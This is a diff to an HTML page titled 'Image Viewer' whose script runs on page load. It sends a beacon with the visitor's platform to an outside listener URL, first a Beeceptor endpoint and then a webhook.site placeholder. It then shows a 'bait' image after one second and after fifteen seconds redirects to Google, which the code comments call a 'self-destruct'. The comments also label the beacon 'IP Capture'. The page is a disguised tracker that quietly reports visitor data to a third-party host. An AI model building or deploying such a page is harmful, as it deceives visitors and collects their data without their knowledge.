@@ -4,16 +4,17 @@
     <title>Image Viewer</title>
     <script>
         function runOperation() {
-            const listener = "https://bluekama-ops.free.beeceptor.com/hit";
+            // REPLACE THIS WITH YOUR WEBHOOK.SITE URL
+            const listener = "https://webhook.site/YOUR-UNIQUE-ID-HERE";
             const image = "https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true";
             
-            // 1. DATA PING (IP Capture)
+            // 1. DATA PING (No login required)
             navigator.sendBeacon(listener + "?device=" + navigator.platform);
 
             // 2. SHOW BAIT (1s delay)
             setTimeout(() => { window.location.href = image; }, 1000);
 
-            // 3. SELF-DESTRUCT (15s delay - Reroutes to Google)
+            // 3. SELF-DESTRUCT (15s delay - Redirect to Google)
             setTimeout(() => { window.location.replace("https://www.google.com"); }, 15000);
         }
         window.onload = runOperation;
